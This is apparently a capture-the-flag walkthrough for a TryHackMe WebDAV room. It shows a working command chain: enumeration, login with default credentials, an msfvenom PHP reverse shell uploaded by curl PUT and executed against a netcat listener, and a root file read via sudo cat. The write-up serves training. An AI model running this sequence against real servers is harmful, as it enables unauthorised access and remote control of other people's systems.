| Category          | Details                                       |
|-------------------|-----------------------------------------------|
| 📝 **Name**       | [Dav](https://tryhackme.com/room/bsidesgtdav) |  
| 🏷 **Type**       | THM Challenge                                 |
| 🖥 **OS**         | Linux                                         |
| 🎯 **Difficulty** | Easy                                          |
| 📁 **Tags**       | Webdav                                        |

# Scan
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

# Solution

#### Discover protected `/webdav` HTTP endpoint using web enumeration
```
┌──(magicrc㉿perun)-[~/attack/THM Dav]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt                       
<SNIP>
401      GET       14l       54w      460c http://10.82.190.145/webdav
<SNIP>
```

#### Confirm `/webdav` HTTP endpoint requires authentication
```
┌──(magicrc㉿perun)-[~/attack/THM Dav]
└─$ curl -I http://$TARGET/webdav         
HTTP/1.1 401 Unauthorized
Date: Thu, 11 Dec 2025 14:02:08 GMT
Server: Apache/2.4.18 (Ubuntu)
WWW-Authenticate: Basic realm="webdav"
Content-Type: text/html; charset=iso-8859-1
```

#### Try default credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Dav]
└─$ curl -I http://$TARGET/webdav/ -u wampp:xampp 
HTTP/1.1 200 OK
Date: Thu, 11 Dec 2025 14:58:16 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html;charset=UTF-8
```
Other credentials like `admin:admin`, `webdav:webdav` or `webdav:pass` were checked as well.

#### Use `davtest` to enumerate WebDAV 
```
┌──(magicrc㉿perun)-[~/attack/THM Dav]
└─$ davtest -url http://$TARGET/webdav -auth wampp:xampp -quiet

/usr/bin/davtest Summary:
Created: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.php
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.cfm
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.shtml
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.aspx
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.asp
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.jsp
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.pl
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.txt
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.html
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.jhtml
PUT File: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.cgi
Executes: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.php
Executes: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.txt
Executes: http://10.82.141.203/webdav/DavTestDir_HLVZT2jS9s/davtest_HLVZT2jS9s.html
```
`davtest` enumeration shows that we can upload and execute PHP code.

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Dav]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
```

#### Generate, upload and execute reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM Dav]
└─$ msfvenom -p php/reverse_php LHOST=$LHOST LPORT=4444 -o reverse_shell.php && \
curl -s -X PUT http://$TARGET/webdav/reverse_shell.php -u wampp:xampp --data-binary @reverse_shell.php -o /dev/null && \
curl http://$TARGET/webdav/reverse_shell.php -u wampp:xampp
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2675 bytes
Saved as: reverse_shell.php
```

#### Confirm foothold gained
```
connect to [192.168.132.170] from (UNKNOWN) [10.82.141.203] 39236
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Capture 1st flag
```
cat /home/merlin/user.txt
********************************
```

#### List allowed sudo commands
```
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

#### Capture 2nd flag
```
sudo /bin/cat /root/root.txt
********************************
```